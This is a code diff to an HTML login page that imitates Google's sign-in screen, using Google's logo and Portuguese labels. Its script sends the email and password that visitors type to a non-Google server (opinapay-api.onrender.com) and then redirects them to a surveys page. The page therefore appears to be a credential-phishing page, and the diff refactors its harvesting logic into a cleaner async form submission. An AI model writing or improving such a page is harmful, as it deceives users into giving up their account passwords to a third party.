@@ -97,7 +97,7 @@
     <div class="logo">
       <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" />
     </div>
-
+    <form id="login-form">
     <h2>Fazer login</h2>
     <p>Use sua Conta</p>
     <input type="email" id="email" placeholder="E-mail ou telefone" />
@@ -109,38 +109,40 @@
     <div class="buttons">
       <button class="btn btn-primary" onclick="login()">Avançar</button>
     </div>
+  </form>
   </div>
 
   <script>
-    function login() {
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-  
-      if (!email || !password) {
-        alert('Preencha e-mail e senha.');
-        return;
-      }
-  
-      fetch('https://opinapay-api.onrender.com/login/google', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password })
-      })
-      .then(async response => {
-        const data = await response.json();
-  
-        if (data.success) {
-          window.location.href = "pesquisas.html";
-        } else {
-          throw new Error(data.error || 'Falha no cadastro');
-        }
-      })
-      .catch(err => {
-        alert(err.message);
-        console.error(err);
-      });
+        const API_URL = 'https://opinapay-api.onrender.com';
+
+async function login() {
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  try {
+    const response = await fetch(`${API_URL}/login/google`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    });
+    const data = await response.json();
+    if (data.success) {
+      window.location.href = 'pesquisas.html';
+    } else {
+      throw new Error(data.error || 'Falha no login');
     }
-  </script>
+  } catch (err) {
+    alert(err.message);
+    console.error(err);
+  }
+}
+
+document.getElementById('login-form')
+  .addEventListener('submit', function(e) {
+    e.preventDefault();
+    login();
+  });
+</script>
   
 </body>
 </html>
